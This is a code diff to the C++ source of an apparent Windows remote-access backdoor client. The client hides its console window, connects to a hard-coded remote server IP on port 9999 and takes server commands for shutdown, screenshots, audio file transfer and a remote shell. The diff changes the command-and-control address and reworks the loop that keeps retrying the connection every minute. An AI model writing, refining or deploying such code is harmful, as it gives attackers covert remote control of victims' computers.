@@ -12,7 +12,7 @@
 #pragma warning(disable:4996)
 
 #define PORT 9999
-#define SERVER_IP "94.198.218.23"
+#define SERVER_IP "45.9.43.217"
 #define SMALL_BUFFLEN 4096
 #define RESTART_PROGRAM -13
 
@@ -23,7 +23,7 @@ wchar_t tmpBuffW[6];
 wchar_t PathToAudio[MAX_PATH];
 
 
-void GetWC(wchar_t* dest , const char* c)
+void GetWC(wchar_t* dest, const char* c)
 {
 	const size_t cSize = strlen(c) + 1;
 	mbstowcs(dest, c, cSize);
@@ -38,7 +38,7 @@ void GetFormatAudioFile(const char* command) {
 		AudioFormatA[start - 6] = command[start];
 		start++;
 	}
-	GetWC(AudioFormatW , AudioFormatA);
+	GetWC(AudioFormatW, AudioFormatA);
 }
 
 BOOL StartsWith(char* buffer, const char* string) {
@@ -51,19 +51,6 @@ BOOL StartsWith(char* buffer, const char* string) {
 	return TRUE;
 }
 
-void RestartThisProgram() {
-	wchar_t PathToThisProcess[MAX_PATH];
-	ZeroMemory(PathToThisProcess, sizeof(PathToThisProcess));
-	GetModuleFileNameW(NULL, PathToThisProcess, MAX_PATH);
-	STARTUPINFO si;
-	ZeroMemory(&si, sizeof(si));
-	PROCESS_INFORMATION pi;
-	CreateProcess(PathToThisProcess, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
-		NULL, NULL, &si, &pi);
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
-	ExitProcess(RESTART_PROGRAM);
-}
 
 void GenerateRandomName() {
 	std::random_device rd;
@@ -84,8 +71,8 @@ enum CurrState {
 	RESULT_OF_COMMAND_SEND,
 	SENDING_SCREENSHOT_IN_PROGRESS,
 	RECVING_MP3_IN_PROGRESS,
-	SHUTDOWN , 
-	REMOTESHELL , 
+	SHUTDOWN,
+	REMOTESHELL,
 	EXIT
 };
 
@@ -99,7 +86,6 @@ int SmallRecv(SOCKET sock, char* buff, int nLenght) {
 		int nCurrRecv = recv(sock, CurrBuff, CommonBytes, 0);
 		CommonBytes -= nCurrRecv;
 
-		if (nCurrRecv == 0) RestartThisProgram();
 		for (int i = start; i < start + nCurrRecv; ++i) {
 			buff[i] = CurrBuff[i - start];
 		}
@@ -108,25 +94,18 @@ int SmallRecv(SOCKET sock, char* buff, int nLenght) {
 	return nLenght;
 }
 
-
-int main() {
-	FreeConsole();
-	WSADATA wsaData;
-	WSAStartup(MAKEWORD(2, 2), &wsaData);
-	SOCKET ClientSoc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
-	sockaddr_in ServerAddr;
-	ServerAddr.sin_family = AF_INET;
-	ServerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
-	ServerAddr.sin_port = htons(PORT);
-
+void InitialConnection(SOCKET ClientSoc, sockaddr_in ServerAddr) {
 	if (WSAConnect(ClientSoc, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
 		LoadMessage("Connection to Server failed...");
-		closesocket(ClientSoc);
-		WSACleanup();
-		RestartThisProgram();
+		Sleep(60000);
+		InitialConnection(ClientSoc, ServerAddr);
 	}
+	return;
+}
 
 
+
+void MainThread(SOCKET ClientSoc) {
 	CurrState cState = NON_CONNECTION_ESTABLISHED_SEND;
 
 	while (TRUE) {
@@ -157,7 +136,7 @@ int main() {
 		{
 			char buffRecv[SMALL_BUFFLEN];
 			ZeroMemory(&buffRecv, sizeof(buffRecv));
-  			SmallRecv(ClientSoc, buffRecv, SMALL_BUFFLEN);
+			SmallRecv(ClientSoc, buffRecv, SMALL_BUFFLEN);
 
 			if (strcmp(buffRecv, "SHUTDOWN") == 0) {
 				cState = SHUTDOWN;
@@ -182,14 +161,13 @@ int main() {
 				cState = REMOTESHELL;
 				break;
 			}
-			std::string ErrorMessage= std::string("Incorrect Command Server. BuffRecv : ") + std::string(buffRecv);
+			std::string ErrorMessage = std::string("Incorrect Command Server. BuffRecv : ") + std::string(buffRecv);
 			LoadMessage(ErrorMessage.c_str());
 			break;
 
 		}
 		case EXIT: {
-			closesocket(ClientSoc);
-			RestartThisProgram();
+			return;
 		}
 		case REMOTESHELL: {
 			wchar_t PathToProgramFiles[MAX_PATH];
@@ -281,7 +259,7 @@ int main() {
 			}
 
 			while (TRUE) {
-				ZeroMemory(buffer, SMALL_BUFFLEN);  
+				ZeroMemory(buffer, SMALL_BUFFLEN);
 				int iResult = SmallRecv(ClientSoc, buffer, SMALL_BUFFLEN);
 
 				if (StartsWith(buffer, "ENDOFF")) break;
@@ -294,4 +272,25 @@ int main() {
 		}
 		}
 	}
+}
+
+int main() {
+	FreeConsole();
+	WSADATA wsaData;
+	sockaddr_in ServerAddr;
+	ServerAddr.sin_family = AF_INET;
+	ServerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+	ServerAddr.sin_port = htons(PORT);
+
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+	while (TRUE) {
+		SOCKET ClientSoc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
+
+		InitialConnection(ClientSoc, ServerAddr);
+		MainThread(ClientSoc);
+
+		closesocket(ClientSoc);
+	}
+	WSACleanup();
 }
